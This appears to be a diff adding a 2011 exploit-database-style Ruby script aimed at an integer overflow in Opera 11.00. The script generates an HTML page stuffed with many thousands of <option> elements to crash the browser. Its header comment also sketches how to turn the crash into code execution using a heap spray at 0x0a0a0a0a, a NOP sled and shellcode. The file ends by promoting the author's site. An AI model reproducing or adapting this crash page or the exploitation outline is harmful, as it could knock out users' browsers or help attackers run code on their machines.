@@ -1,0 +1,54 @@
+#
+#
+#[+]Exploit Title: Exploit Integer Overflow Opera Web Browser 11.00
+#[+]Date: 24\01\2011
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://get12.opera.com/pub/opera/win/1100/int/Opera_1100_int_Setup.exe
+#[+]Version: 11.00
+#[+]Tested On: WIN-XP SP3 PORTUGUESE BRAZILIAN
+#[+]CVE: N/A
+#
+#
+#
+#Note:
+#This exploit is only a Denial of Service in opera web browser
+#I created a poc using heap spray that allow code execution
+#but I will not post here because it can be used for evil
+#And I do not want that.
+#   for you to explore the program you control with the number esi childrens then created using a spray heap address any such
+#0a0a0a0a the data in address should be the point to the beginning of the shellcode
+#0a0a0a0a => \x90\x90\x90 => and your shellcode
+#Then the function mov eax, [esi] places the value in eax then the program call eax  and boom run shellcode !!!!!
+#
+#
+#
+
+
+
+
+print "[*]Creating the Exploit\n"
+i = 0
+buf = "<option>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</option>\n" 
+
+while i<0x4141 
+     buf += "<option>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</option>\n" 
+	 i+=1
+end
+
+HTML =
+"<html>\n"+
+"<body>\n\n"+
+"<select>\n\n"
+
+HTML+=buf * 100
+HTML += "\n\n\n\</select>\n\n"+
+"</body>\n\n\n"+
+"</html>\n\n\n\n\n"
+
+f = File.open("Exploit_opera_11.00.html","w")
+f.puts HTML
+f.close
+puts "\n\n\[*]File Created With Sucess"
+sleep(1)
+puts "[*]Go to my Site www.invasao.com.br!"
+sleep(1)
